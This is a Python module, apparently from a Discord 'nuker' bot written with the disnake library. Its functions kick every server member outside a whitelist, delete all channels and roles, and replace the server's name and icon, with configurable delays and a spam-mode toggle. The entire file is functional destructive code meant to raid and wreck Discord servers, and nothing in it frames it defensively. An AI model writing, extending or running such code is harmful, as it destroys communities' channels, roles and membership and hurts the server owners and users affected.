import asyncio
import disnake
from typing import Dict, Optional
from modules.utils import log_event, update_statistic
from init import *

# ===== GLOBAL VARIABLES =====
soup_mode_active = False
enable_spam = False


async def apply_delay(delay_type: str):
    if CustomDelays:
        delays = {
            "kick": KickDelay,
            "ban": BanDelay,
            "spam": SpamDelay,
            "role": RoleSpamDelay,
            "channel": ChanelSpamDelay,
            "remove": ChanelRemoveDelay
        }
        delay = delays.get(delay_type, 0)
        if delay > 0:
            await asyncio.sleep(delay)


async def perform_mass_kick(guild, bot_member, ctx=None) -> Dict[str, int]:
    kicked = 0
    failed = 0

    log_event("INFO", f"Starting mass kick on server: {guild.name}", "KICK")

    for member in guild.members:
        if member.id in whit:
            continue
        if member.id == bot_member.id:
            continue
        if member.id in ignore:
            continue

        try:
            # Send message before kick
            if KickMessage and not soup_mode_active:
                try:
                    from init import kick_message
                    await member.send(kick_message)
                    await apply_delay("kick")
                except:
                    pass

            # Kick user
            await member.kick()
            kicked += 1
            update_statistic("members_kicked")

            # Logging
            if not soup_mode_active:
                log_event("SUCCESS", f"User kicked: {member} ({member.id})", "KICK")

            # Delay between kicks
            await apply_delay("kick")

        except disnake.Forbidden:
            log_event("ERROR", f"No permission to kick: {member}", "KICK")
            failed += 1
        except Exception as e:
            log_event("ERROR", f"Kick error {member}: {e}", "KICK")
            failed += 1

    log_event("INFO", f"Mass kick completed: {kicked} kicked, {failed} errors", "KICK")
    return {"kicked": kicked, "failed": failed}


async def delete_all_channels(guild, ctx=None) -> Dict[str, int]:
    deleted = 0
    failed = 0

    log_event("INFO", f"Starting channel deletion on server: {guild.name}", "CHANNELS")

    # Delete channels
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
            update_statistic("channels_deleted")
            await apply_delay("remove")
        except Exception as e:
            log_event("ERROR", f"Error deleting channel {channel.name}: {e}", "CHANNELS")
            failed += 1

    # Create final channel
    if EndChanel or soup_mode_active:
        try:
            channel_name = EndChanelName if not soup_mode_active else SoupDayEndChanelName
            await guild.create_text_channel(name=channel_name)
            update_statistic("channels_created")
            log_event("SUCCESS", f"Channel created: {channel_name}", "CHANNELS")
        except Exception as e:
            log_event("ERROR", f"Error creating channel: {e}", "CHANNELS")

    log_event("INFO", f"Channel deletion completed: {deleted} deleted, {failed} errors", "CHANNELS")
    return {"deleted": deleted, "failed": failed}


async def delete_all_roles(guild, ctx=None) -> Dict[str, int]:
    deleted = 0
    failed = 0

    log_event("INFO", f"Starting role deletion on server: {guild.name}", "ROLES")

    for role in guild.roles:
        # Skip @everyone and bot roles
        if role.name == "@everyone" or role.is_bot_managed():
            continue

        try:
            await role.delete()
            deleted += 1
            update_statistic("roles_deleted")
            await apply_delay("role")
        except Exception as e:
            log_event("ERROR", f"Error deleting role {role.name}: {e}", "ROLES")
            failed += 1

    log_event("INFO", f"Role deletion completed: {deleted} deleted, {failed} errors", "ROLES")
    return {"deleted": deleted, "failed": failed}


async def change_guild_icon(guild, ctx=None) -> bool:
    """Change server icon"""
    try:
        from init import image_path
        with open(image_path, 'rb') as image_file:
            image_data = image_file.read()
            await guild.edit(icon=image_data)
        log_event("SUCCESS", "Server icon changed", "GUILD")
        return True
    except FileNotFoundError:
        log_event("ERROR", "Icon file not found", "GUILD")
        return False
    except Exception as e:
        log_event("ERROR", f"Error changing icon: {e}", "GUILD")
        return False


async def rename_guild_server(guild, new_name: str, ctx=None) -> bool:
    try:
        await guild.edit(name=new_name)
        log_event("SUCCESS", f"Server renamed to: {new_name}", "GUILD")
        return True
    except Exception as e:
        log_event("ERROR", f"Error renaming server: {e}", "GUILD")
        return False


def set_soup_mode(active: bool):
    # Set soup day mode
    global soup_mode_active
    soup_mode_active = active


def set_spam_mode(active: bool):
    # Set spam mode
    global enable_spam
    enable_spam = active


def get_soup_mode() -> bool:
    # Get soup day mode status
    return soup_mode_active


def get_spam_mode() -> bool:
    # Get spam mode status
    return enable_spam